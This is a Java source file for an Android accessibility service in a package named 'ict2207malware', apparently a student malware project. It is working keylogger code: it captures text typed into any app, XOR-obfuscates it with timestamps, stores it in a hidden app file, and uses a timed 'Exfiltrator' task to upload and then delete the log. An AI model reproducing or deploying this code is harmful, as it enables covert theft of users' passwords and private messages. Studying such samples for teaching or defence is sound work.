package com.example.ict2207malware;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Context;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.util.Timer;
import java.util.TimerTask;
import java.util.UUID;

public class Accessibility extends AccessibilityService {
    private File id = null;
    private File data = null;
    private String uuid;
    private String idFilename = "id.dat";
    private String dataFilename = "data.tmp";
    private Timer timer;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        final int eventType = event.getEventType();
        String eventText = null;
        switch (eventType) {
            // TODO: look up other type of accessibility events
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                eventText = String.valueOf(event.getText());
                break;
        }
        if(eventText == null) {
           return;
        }
        // TODO: Process logged text entries here
        logDebug(eventText);
        try {
            boolean created = this.data.createNewFile();
            if(created) {
                addMagic();
            }
            writeData(formatData(eventText));
            readData();
            startSync();
        }
        catch(Exception e) {
            logFileError(e, "1");
        }
    }

    @Override
    public void onInterrupt() {
        // TODO: figure this out
    }

    @Override
    public void onServiceConnected() {
        AccessibilityServiceInfo info = getServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_SPOKEN;
        info.notificationTimeout = 20;
        this.setServiceInfo(info);
        // read internal data
        this.id = new File(getBaseContext().getFilesDir(), idFilename);
        if(this.id.length() == 0) {
            initializeId();
        }
        else {
            this.uuid = readId();
        }
        this.data = new File(getBaseContext().getFilesDir(), uuid + dataFilename);
        if(this.data.length() != 0) {
            startSync();
        }
    }

    private void startSync() {
        if(timer != null) timer.cancel();
        timer = new Timer();
        Exfiltrator task = new Exfiltrator();
        task.setData(data);
        timer.schedule(task, 5000L);
    }

    private class Exfiltrator extends TimerTask {
        private File data;

        @Override
        public void run() {
            Log.d("DEBUG", "Started timer to sync");
            sendNow();
        }
        private void sendNow() {
            try {
                MainActivity.uploads(this.data.getCanonicalPath());
                this.data.delete();
            }
            catch (Exception e) {
                logFileError(e, "2");
            }
        }
        public void setData(File data) {
            this.data = data;
        }
    }

    private void initializeId() {
        try {
            OutputStreamWriter os = new OutputStreamWriter(getBaseContext().openFileOutput(idFilename, Context.MODE_PRIVATE));
            this.uuid = UUID.randomUUID().toString();
            os.write(this.uuid);
            os.close();
        }
        catch (Exception e) {
            logFileError(e, "21");
        }
    }

    private String readId() {
        try {
            InputStream inputStream = getBaseContext().openFileInput(idFilename);
            InputStreamReader inputStreamReader = new InputStreamReader(inputStream);
            BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
            String id = bufferedReader.readLine();
            inputStream.close();
            return id;
        }
        catch (Exception e) {
            logFileError(e, "22");
        }
        return null;
    }

    private void logFileError(Exception e, String s) {
        Log.e(s + "ERROR", "File IO error: " + e.toString());
    }

    private void logDebug(String s) {
        Log.d("DEBUG", "ACCESSIBILITY SERVICE: " + s);
    }

    private byte[] getTSBytes() {
        Long ts = System.currentTimeMillis();
        byte[] b = longToByte(ts);
        logDebug("Time: " + byteToLong(b));
        return b;
    }

    private byte[] longToByte(Long l) {
        ByteBuffer buf = ByteBuffer.allocate(Long.BYTES);
        buf.putLong(l);
        return buf.array();
    }

    private Long byteToLong(byte[] b) {
        ByteBuffer buf = ByteBuffer.allocate(Long.BYTES);
        buf.put(b);
        buf.flip();
        return buf.getLong();
    }

    private void writeData(byte[] bytes) {
        try {
            FileOutputStream fs = getBaseContext().openFileOutput(uuid + dataFilename, Context.MODE_APPEND);
            fs.write(bytes);
            fs.close();
        }
        catch (Exception e) {
            logFileError(e, "3");
        }
    }
    // to delete this function when done
    private void readData() {
        try {
            StringBuilder text = new StringBuilder();
            BufferedReader br = new BufferedReader(new FileReader(this.data));
            String line;
            while ((line = br.readLine()) != null) {
                text.append(line);
            }
            br.close();
            Log.d("DEBUG", text.toString());
        }
        catch (Exception e) {
            logFileError(e, "11");
        }
    }

    private void addMagic() {
        String str = "bakaneko";
        byte[] magic = str.getBytes(StandardCharsets.UTF_8);
        writeData(magic);
    }

    private byte[] formatData(String s) {
        byte[] t = getTSBytes();
        byte[] d = s.getBytes(StandardCharsets.UTF_8);
        byte[] res;
        int l = d.length;
        byte[] len = ByteBuffer.allocate(Integer.BYTES).putInt(l).array();
        // store in binary
        for (int i = 0; i < l; i++) {
            d[i] ^= ~t[i%t.length];
        }
        // concatenate
        ByteArrayOutputStream os = new ByteArrayOutputStream();
        try {
            os.write(t);
            os.write(len);
            os.write(d);
            res = os.toByteArray();
            os.close();
            return res;
        }
        catch (Exception e) {
            logFileError(e, "4");
            return null;
        }
    }
}
